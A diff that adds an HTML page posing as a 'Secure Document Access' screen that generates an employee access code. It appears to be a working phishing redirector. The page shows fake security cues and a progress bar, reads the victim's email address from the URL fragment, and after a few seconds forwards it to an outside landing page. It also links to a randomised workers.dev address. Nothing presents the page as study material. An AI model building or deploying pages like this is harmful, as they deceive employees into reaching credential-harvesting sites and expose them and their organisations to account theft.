@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Access</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: linear-gradient(145deg, #f0f4f8 0%, #d9e2ec 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a2b3c;
+        }
+
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(15, 42, 67, 0.1);
+            padding: 3rem 2.5rem;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.8);
+        }
+
+        .document-preview {
+            position: relative;
+            width: 70px;
+            height: 90px;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            margin: 0 auto 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .document-preview::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, white 50%, #cbd5e1 50%);
+            border-bottom-left-radius: 8px;
+            border-left: 2px solid #e2e8f0;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .document-preview i {
+            font-size: 1.8rem;
+            color: #102a43;
+        }
+
+        .status-shield {
+            position: absolute;
+            bottom: -10px;
+            right: -15px;
+            background: #102a43;
+            color: white;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            border: 3px solid white;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 42, 67, 0.4); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(16, 42, 67, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 42, 67, 0); }
+        }
+
+        h1 { font-size: 1.4rem; font-weight: 700; color: #102a43; margin-bottom: 0.8rem; }
+        p { color: #627d98; font-size: 0.95rem; line-height: 1.6; }
+
+        .loader-container {
+            margin: 2.5rem 0;
+        }
+
+        .progress-text {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 8px;
+            background: #f0f4f8;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #102a43;
+            border-radius: 20px;
+            animation: load 3.5s forwards cubic-bezier(0.65, 0, 0.35, 1);
+        }
+
+        @keyframes load {
+            0% { width: 0%; }
+            30% { width: 45%; }
+            60% { width: 75%; }
+            100% { width: 100%; }
+        }
+
+        .security-note {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: #f8fafc;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            color: #475569;
+            font-weight: 500;
+        }
+
+        .manual-link {
+            margin-top: 2rem;
+            display: block;
+            font-size: 0.75rem;
+            color: #94a3b8;
+            text-decoration: underline;
+            transition: color 0.2s;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="document-preview">
+            <i class="fas fa-file-invoice"></i>
+            <div class="status-shield">
+                <i class="fas fa-lock"></i>
+            </div>
+        </div>
+
+        <h1>Preparing Document Access</h1>
+        <p>Your unique employee access code is being generated. <br>Please do not refresh this page.</p>
+
+        <div class="loader-container">
+            <span class="progress-text" id="status-text">Generating Unique Access Code...</span>
+            <div class="loading-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+
+        <div class="security-note">
+            <i class="fas fa-shield-alt" style="color: #102a43;"></i> Secure Handover Protocol Active
+        </div>
+
+        <a href="https://wmknl-wygi-fv6t.p-436szmjv.workers.dev/l/pEalb33HYKw" class="manual-link">
+            Not redirecting? Click here
+        </a>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        // Extract email from hash fragment (passed by Worker)
+        const email = window.location.hash ? window.location.hash.substring(1) : null;
+        
+        // Always redirect to the landing page at hldrinc.com/wWGsTflw
+        const landingPageUrl = "https://hldrinc.com/wWGsTflw";
+        const statusText = document.getElementById('status-text');
+        
+        // Final status update before redirect
+        setTimeout(() => {
+            statusText.textContent = "Finalizing Secure Link...";
+        }, 2200);
+
+        // Redirect after 3.8 seconds with email in hash if provided
+        setTimeout(() => {
+            let destination = landingPageUrl;
+            if (email) {
+                destination += "#" + email;
+            }
+            window.location.href = destination;
+        }, 3800);
+    </script>
+</body>
+</html>
